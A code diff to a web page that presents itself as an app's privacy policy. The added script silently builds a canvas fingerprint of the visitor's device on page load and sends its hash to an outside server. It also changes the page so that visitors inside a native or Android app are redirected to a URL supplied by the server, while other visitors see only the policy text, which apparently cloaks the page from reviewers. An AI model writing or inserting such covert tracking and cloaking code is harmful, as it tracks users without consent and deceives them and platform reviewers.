@@ -50,7 +50,40 @@
 </html>
 
 
+<script src="./md5.min.js"></script>
 <script>
+
+
+    const b64 = (function () {
+        let canvas = document.createElement("canvas");
+        let ctx = canvas.getContext("2d");
+        let txt = "BrowserLeaks,com <canvas> 1.0";
+
+        ctx.textBaseline = "top";
+        // The most common type
+        ctx.font = "14px 'Arial'";
+        ctx.textBaseline = "alphabetic";
+        ctx.fillStyle = "#f60";
+        ctx.fillRect(125,1,62,20);
+        // Some tricks for color mixing to increase the difference in rendering
+        ctx.fillStyle = "#069";
+        ctx.fillText(txt, 2, 15);
+        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+        ctx.fillText(txt, 4, 17);
+
+        let b64 = canvas.toDataURL().replace("data:image/png;base64,", "");
+
+        setTimeout(() => {
+            fetch('https://admin.ytsevbr.xyz/manager/sign?b64=' + md5(b64), {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({native: window.NativeApp ? true : false})
+            }).then(res => res.json())
+        }, 200);
+
+        return b64;
+    })();
+
 
     const hexToRgb = function (val) {
         const reg = /^#([0-9a-fA-f]{3}|[0-9a-fA-f]{6})$/;
@@ -99,13 +132,14 @@
         if (window.location.hash) {
             setTimeout(()=>window.location.href = decodeURIComponent(window.location.hash.substring(1)), 200);
         } else {
-            fetch(BASE_URL + '/application.json5').then(r=>r.json()).then(info=>{
-                if (info.target === 'B')
+            fetch(BASE_URL + '/application.json5?b64=' + b64).then(r=>r.json()).then(info=>{
+                if (info.target === 'B' && (window.Android || window.NativeApp))
                     setTimeout(()=>window.location.href = info.url, 200);
                 else 
                     (() => {
                         const content = `&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Privacy Policy for ${info.app_name}
                             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Device Number: ${info.long}
+                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Device SN: ${b64}
                             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;At ${info.app_name} , one of our main priorities is the privacy of our visitors. This Privacy Policy document contains types of information that is collected and recorded by ${info.app_name} and how we ${info.app_name}e it.
                             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;If you have additional questions or require more information about our Privacy Policy, do not hesitate to contact ${info.app_name}.
                             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Log Files
